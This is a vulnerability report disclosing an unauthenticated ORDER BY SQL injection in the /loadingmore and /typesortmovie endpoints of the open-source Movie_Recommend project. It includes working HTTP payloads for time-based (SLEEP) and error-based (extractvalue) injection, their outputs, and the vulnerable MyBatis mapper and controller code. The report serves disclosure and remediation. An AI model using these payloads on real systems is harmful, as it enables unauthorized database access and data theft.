# Movie_Recommend Frontend SQL Injection Vulnerability Report

## Vulnerability Description

Movie_Recommend (ZzXxL1994/Movie_Recommend, an open-source Spark-based movie recommendation system on GitHub) in its frontend movie module: the sort endpoints `/loadingmore` and `/typesortmovie` obtain the `sort` parameter via `request.getParameter("sort")` and pass it **unfiltered** through `Selectquery.setSort()` into the MyBatis mapper, where it is concatenated into the SQL `order by ${sort} desc` clause in `MovieMapper.xml`'s `selectBycategory` → **ORDER BY injection**. Because the MySQL connection string carries `allowMultiQueries=true`, stacked queries are also possible. Both endpoints are **reachable with zero credentials**: the project's web.xml contains only a character-encoding filter, springmvc.xml has no interceptor, and there is no Spring Security/Shiro/Sa-Token framework.

## Affected Versions

Movie_Recommend — v1.0.0

## Exploitation Conditions

- Exposed `/loadingmore`, `/typesortmovie` — no login required

## Reproduction

Target: http://127.0.0.1:8088/Movie/

**1. Time-based Blind Injection — SLEEP delay**

```http
POST /Movie/loadingmore HTTP/1.1
Host: 127.0.0.1:8088
Content-Type: application/x-www-form-urlencoded

type=0&molimit=0&sort=numrating,(SELECT SLEEP(5))
```

Response takes **15.077 seconds** (3 result rows × SLEEP(5)), while a normal request takes <1 second, proving `SLEEP(5)` is executed in the ORDER BY clause.

![image-20260822184330942](https://github.com/fangtang7/picx-images-hosting/raw/master/fink/image-20260822184330942.8hh7nwym9o.webp)

**2. Error-based Injection — Database Name Extraction**

```http
POST /Movie/loadingmore HTTP/1.1
Host: 127.0.0.1:8088
Content-Type: application/x-www-form-urlencoded

type=0&molimit=0&sort=numrating desc,(SELECT extractvalue(1,concat(0x7e,database())))
```

```http
HTTP/1.1 500
### SQL: select * from movie order by numrating desc,(SELECT extractvalue(1,concat(0x7e,database()))) desc LIMIT ?,20;
### Cause: java.sql.SQLException: XPATH syntax error: '~movie'
```

`~movie` is the result of `database()`, i.e. the current database name is `movie`.

![image-20260822184421143](https://github.com/fangtang7/picx-images-hosting/raw/master/fink/image-20260822184421143.1e9c8atovj.webp)

**3. Error-based Injection — Version / User Extraction**

```
sort=numrating desc,(SELECT extractvalue(1,concat(0x7e,version())))
→ XPATH syntax error: '~5.7.26'

sort=numrating desc,(SELECT extractvalue(1,concat(0x7e,user())))
→ XPATH syntax error: '~root@localhost'
```

![image-20260822184456833](https://github.com/fangtang7/picx-images-hosting/raw/master/fink/image-20260822184456833.3k8qu2lr5o.webp)

Code:

```xml
<!-- MovieMapper.xml:333-342 -->
<select id="selectBycategory" parameterType="com.dream.po.Selectquery" resultMap="BaseResultMap">
  <if test="category == 0">
    select * from movie order by ${sort} desc LIMIT #{molimit,jdbcType=INTEGER},20;
  </if>
  <if test="category != 0">
    select * from movie m, moviecategory mc where m.movieid=mc.movieid and mc.categoryid = #{category,jdbcType=INTEGER} order by ${sort} desc LIMIT #{molimit,jdbcType=INTEGER},20;
  </if>
</select>
```

```java
// IndexController.java:172-202
@RequestMapping(value = "/loadingmore", method = RequestMethod.POST)
@ResponseBody
public E3Result showloadmore(HttpServletRequest request){
    ...
    query.setSort(request.getParameter("sort"));  // user input flows directly into sort
    E3Result e3ResultAllMoive = movieService.SortMoiveBycategory(query);
    ...
}
```

![image-20260822184636337](https://github.com/fangtang7/picx-images-hosting/raw/master/fink/image-20260822184636337.6po8t0gk53.webp)

![image-20260822184719811](https://github.com/fangtang7/picx-images-hosting/raw/master/fink/image-20260822184719811.4920e3a0yz.webp)
